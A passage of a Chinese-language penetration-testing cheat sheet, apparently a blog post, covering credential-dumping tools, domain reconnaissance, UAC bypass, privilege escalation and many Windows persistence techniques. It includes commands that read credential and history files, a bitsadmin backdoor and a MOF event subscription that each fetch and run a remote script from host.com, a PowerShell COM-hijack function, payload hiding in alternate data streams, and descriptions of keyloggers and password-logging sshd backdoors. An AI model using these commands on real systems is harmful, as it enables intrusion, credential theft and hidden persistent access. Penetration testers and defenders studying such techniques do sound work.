<li><a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">QuarksPwDump</a> <a href="https://github.com/mcandre/fgdump" target="_blank" rel="noopener">fgdump</a></li>
<li>星号查看器等</li>
</ul>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><ul>
<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a>  </li>
<li><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">mimipenguin</a></li>
</ul>
<h3 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h5><ul>
<li><a href="https://nmap.org/" target="_blank" rel="noopener">nmap</a> </li>
<li><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">masscan</a> </li>
<li><a href="https://github.com/zmap/zmap" target="_blank" rel="noopener">zmap</a></li>
<li>s扫描器 </li>
<li>自写脚本等 </li>
<li>NC </li>
<li>…</li>
</ul>
<h4 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h4><ul>
<li>DMZ</li>
<li>管理网</li>
<li>生产网</li>
<li>测试网</li>
</ul>
<h4 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h4><p>ipconfig:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure>
<p>net:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain ------&gt; 查询域用户</span><br><span class="line">net group &#x2F;domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view &#x2F;domain ------&gt; 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname</span><br></pre></td></tr></table></figure>
<p>dsquery </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; &#x2F;domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group &#x2F;domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time &#x2F;domain------&gt;列出该域内域控制器</span><br></pre></td></tr></table></figure>

<h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul>
<li>NETBIOS 信息收集 </li>
<li>SMB 信息收集  </li>
<li>空会话信息收集  </li>
<li>漏洞信息收集等 </li>
</ul>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h4><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li>使用IFileOperation COM接口</li>
<li>使用Wusa.exe的extract选项</li>
<li>远程注入SHELLCODE 到傀儡进程</li>
<li>DLL劫持，劫持系统的DLL文件</li>
<li>eventvwr.exe and registry hijacking</li>
<li>sdclt.exe</li>
<li>SilentCleanup</li>
<li>wscript.exe</li>
<li>cmstp.exe</li>
<li>修改环境变量，劫持高权限.Net程序</li>
<li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li>
<li>直接提权过UAC</li>
</ul>
<h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul>
<li><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME </a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC" target="_blank" rel="noopener">Bypass-UAC </a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko" target="_blank" rel="noopener">Yamabiko </a></li>
<li>… </li>
</ul>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ul>
<li><p>windows内核漏洞提权</p>
<blockquote>
<p>检测类:<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a>,<a href="https://github.com/brianwrf/WinSystemHelper" target="_blank" rel="noopener">WinSystemHelper</a>,<a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">wesng</a><br>利用类:<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a>，<a href="https://github.com/AlessandroZ/BeRoot.git" target="_blank" rel="noopener">BeRoot</a></p>
</blockquote>
</li>
<li><p>服务提权 </p>
<blockquote>
<p>数据库服务，ftp服务等</p>
</blockquote>
</li>
<li><p>WINDOWS错误系统配置 </p>
</li>
<li><p>系统服务的错误权限配置漏洞 </p>
</li>
<li><p>不安全的注册表权限配置 </p>
</li>
<li><p>不安全的文件/文件夹权限配置 </p>
</li>
<li><p>计划任务 </p>
</li>
<li><p>任意用户以NT AUTHORITY\SYSTEM权限安装msi </p>
</li>
<li><p>提权脚本 </p>
<blockquote>
<p><a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1" target="_blank" rel="noopener">PowerUP</a>,<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">ElevateKit</a></p>
</blockquote>
</li>
</ul>
<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux-kernel-exploits </a></p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">ls -al &#x2F;etc&#x2F; | grep cron</span><br><span class="line">ls -al &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;at.allow</span><br><span class="line">cat &#x2F;etc&#x2F;at.deny</span><br><span class="line">cat &#x2F;etc&#x2F;cron.allow</span><br><span class="line">cat &#x2F;etc&#x2F;cron.deny</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">cat &#x2F;etc&#x2F;anacrontab</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>
<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">cat &#x2F;root&#x2F;anaconda-ks.cfg</span><br></pre></td></tr></table></figure>

<h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件/文件夹权限配置"></a>不安全的文件/文件夹权限配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br><span class="line">cat ~&#x2F;.nano_history</span><br><span class="line">cat ~&#x2F;.atftp_history</span><br><span class="line">cat ~&#x2F;.mysql_history</span><br><span class="line">cat ~&#x2F;.php_history</span><br></pre></td></tr></table></figure>
<h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure>

<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h3><h4 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h4><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack<br>WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。<br>键盘记录器<br>安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。<br>NTPass<br>获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。<br>Linux 下 openssh 后门<br>重新编译运行的sshd服务，用于记录用户的登陆密码。</p>
<h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> :<br>存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$StaticClass &#x3D; New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null)</span><br><span class="line">$StaticClass.Name &#x3D; &#39;Win32_Command&#39;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure>
<p>读取:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$Payload&#x3D;([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value</span><br></pre></td></tr></table></figure>

<p><strong>包含数字签名的PE文件</strong><br>利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名<br><strong>特殊ADS</strong><br>…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure>
<p>特殊COM文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure>
<p>磁盘根目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure>
<h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run/RunOnce Keys"></a>3、Run/RunOnce Keys</h5><p>用户级 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
<p>管理员 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure>
<h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure>
<h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>
<h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>
<h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create [ServerName] binPath&#x3D; BinaryPathName</span><br></pre></td></tr></table></figure>
<h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure>
<h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
<h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>
<h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a href="http://www.liuhaihua.cn/archives/357579.html" target="_blank" rel="noopener">bitsadmin</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line">bitsadmin &#x2F;addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;host.com&#x2F;calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin &#x2F;Resume backdoor</span><br></pre></td></tr></table></figure>
<h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof "></a>12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html" target="_blank" rel="noopener">mof </a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP1&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 1&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D; &quot;GetObject(\&quot;script:https:&#x2F;&#x2F;host.com&#x2F;test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>管理员执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure>
<h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;BotFilter82&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;BotConsumer23&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;BotFilter82\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure>
<h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a href="https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/" target="_blank" rel="noopener">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[CmdletBinding(SupportsShouldProcess &#x3D; $True, ConfirmImpact &#x3D; &#39;Medium&#39;)]</span><br><span class="line">Param (</span><br><span class="line">[Parameter(Mandatory &#x3D; $True)]</span><br><span class="line">[ValidateNotNullOrEmpty()]</span><br><span class="line">[String]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[Switch]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath &#x3D; &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span><br><span class="line">if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Verbose &quot;Key already exists, consider using -Force&quot;</span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Warning &quot;Failed to create registry key, exiting&quot;</span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose</span><br></pre></td></tr></table></figure>
<h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a href="https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/" target="_blank" rel="noopener">Netsh</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure>
<p>后门触发：每次调用netsh</p>
<blockquote>
<p>dll编写:<a href="https://github.com/outflanknl/NetshHelperBeacon" target="_blank" rel="noopener">https://github.com/outflanknl/NetshHelperBeacon</a></p>
</blockquote>
<h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/" target="_blank" rel="noopener">Shim</a></h5><p>常用方式：<br>InjectDll<br>RedirectShortcut<br>RedirectEXE</p>
<h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a href="https://3gstudent.github.io/3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程<br>使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行<br>工具：<a href="https://github.com/sensepost/rattler" target="_blank" rel="noopener">https://github.com/sensepost/rattler</a><br>工具：<a href="https://github.com/Yonsm/AheadLib" target="_blank" rel="noopener">https://github.com/Yonsm/AheadLib</a></p>
<h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent "></a>18、<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/" target="_blank" rel="noopener">DoubleAgent </a></h5><p>编写自定义Verifier provider DLL<br>通过Application Verifier进行安装<br>注入到目标进程执行payload<br>每当目标进程启动，均会执行payload，相当于一个自启动的方式<br>POC : <a href="https://github.com/Cybellum/DoubleAgent" target="_blank" rel="noopener">https://github.com/Cybellum/DoubleAgent</a></p>
<h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe "></a>19、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/" target="_blank" rel="noopener">waitfor.exe </a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe<br>POC : <a href="https://github.com/3gstudent/Waitfor-Persistence" target="_blank" rel="noopener">https://github.com/3gstudent/Waitfor-Persistence</a></p>
<h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" target="_blank" rel="noopener">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
<h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener">利用VSTO实现的office后门</a><br><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="noopener">Office加载项</a></p>
<ul>
<li>Word WLL </li>
<li>Excel XLL </li>
<li>Excel VBA add-ins </li>
<li>PowerPoint VBA add-ins</li>
</ul>
<blockquote>
<p>参考1 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</a><br>参考2 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/</a></p>
</blockquote>
<h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" target="_blank" rel="noopener">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序<br>POC:<a href="https://github.com/3gstudent/CLR-Injection" target="_blank" rel="noopener">https://github.com/3gstudent/CLR-Injection</a></p>
<h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/" target="_blank" rel="noopener">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测<br>利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p>
<h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/" target="_blank" rel="noopener">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限<br>通过修改注册表实现<br>POC：<a href="https://github.com/3gstudent/COM-Object-hijacking" target="_blank" rel="noopener">https://github.com/3gstudent/COM-Object-hijacking</a> </p>
<h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/" target="_blank" rel="noopener">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限<br>通过修改注册表实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure>
